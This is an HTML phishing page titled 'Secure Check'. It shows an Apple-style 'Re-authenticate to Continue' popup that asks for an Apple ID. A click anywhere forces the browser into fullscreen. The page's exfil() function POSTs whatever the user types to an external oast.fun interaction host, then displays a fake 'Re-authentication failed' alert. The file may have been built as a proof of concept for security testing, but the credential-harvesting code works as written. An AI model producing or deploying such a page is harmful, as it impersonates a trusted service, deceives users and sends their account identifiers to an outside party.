<!DOCTYPE html>
<html>
<head>
  <title>Secure Check</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: black;
      height: 100%;
      overflow: hidden;
    }
    .fake-popup {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: #fff;
      border-radius: 15px;
      width: 300px;
      padding: 20px;
      box-shadow: 0 0 30px rgba(0,0,0,0.4);
      text-align: center;
      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
    }
    .fake-popup h2 {
      font-size: 16px;
      margin-bottom: 10px;
    }
    .fake-popup input {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      border-radius: 6px;
      border: 1px solid #ccc;
    }
    .fake-popup button {
      padding: 10px 20px;
      border: none;
      background: #007aff;
      color: white;
      font-weight: bold;
      border-radius: 6px;
    }
  </style>
</head>
<body>

<div class="fake-popup">
  <h2>Re-authenticate to Continue</h2>
  <input id="email" placeholder="Enter your Apple ID" />
  <button onclick="exfil()">Continue</button>
</div>

<script>
  document.addEventListener('click', () => {
    document.documentElement.requestFullscreen().catch(()=>{});
  });

  function exfil() {
    const data = document.getElementById('email').value;
    fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun', {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email: data })
    });
    alert("Re-authentication failed. Please try again.");
  }
</script>

</body>
</html>
